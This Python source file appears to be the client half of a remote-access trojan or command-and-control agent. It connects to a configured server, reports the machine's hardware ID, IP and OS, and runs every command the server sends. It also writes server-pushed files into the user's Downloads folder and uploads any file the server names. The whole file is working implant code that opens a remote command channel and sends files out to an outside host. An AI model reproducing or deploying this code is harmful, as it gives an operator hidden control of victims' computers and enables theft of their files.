import socketio
from command_handler import run_command
from utils.system_info import get_hwid, get_ip, get_os
from config import SERVER_URL 
import sys
import os

sio = socketio.Client()
UPLOAD_PATH = os.path.join(os.path.expanduser("~"), "Downloads")
DOWNLOAD_PATH = os.path.join(os.path.expanduser("~"), "Desktop")

@sio.event
def connect():
    print('Connection established')
    register_client()

@sio.event
def disconnect():
    print('Disconnected from server')


def connect_to_server():
    print("[*] Connecting to server...")
    sio.connect(SERVER_URL)
    sio.wait()

def register_client():
    client_info = {
        'hwid': get_hwid(),
        'ip': get_ip(),
        'os': get_os()
    }
    sio.emit("register", client_info)

@sio.on('destroy')
def destroy_connection():
    sio.disconnect()
    sys.exit(0)

@sio.on('sendCommand')
def handle_command(command):
    print(f"[*] Received command: {command}")
    response = run_command(command)
    sio.emit("commandResponse", response)

@sio.on('receiveFile')
def receive_File(data):
    if 'filename' in data and 'fileBuffer' in data:
        filename = data['filename']
        filebuffer = data['fileBuffer']

        file_path = os.path.join(UPLOAD_PATH, filename)

        with open(file_path, "wb") as f:
            f.write(filebuffer)

        print(f"File {filename} received and saved in {UPLOAD_PATH}")
    else:
        print("Error: Expected keys 'filename' and 'fileBuffer' not found in the received data.")

@sio.on('requestFile')
def send_file(data):
    try:
        filepath = data['filePath']
        filename = data['filename']

        if not filepath or not filename:
            print("Error: Missing required keys 'filePath' or 'filename'")
            sio.emit("fileResponse", {"status": False, "filename": filename})
            return

        full_file_path = os.path.join(filepath, filename)
        if os.path.exists(full_file_path):
            with open(full_file_path, "rb") as f:
                filebuffer = f.read()
                sio.emit("fileResponse", {"status": True, "filename": filename, "fileBuffer": filebuffer})
                print(f"File {filename} sent to server")
        else:
            print(f"Error: File {filename} not found in {filepath}")
            sio.emit("fileResponse", {"status": False, "filename": filename})
    except Exception as e:
        print(f"An error occurred: {e}")
        sio.emit("fileResponse", {"status": False, "filename": filename})
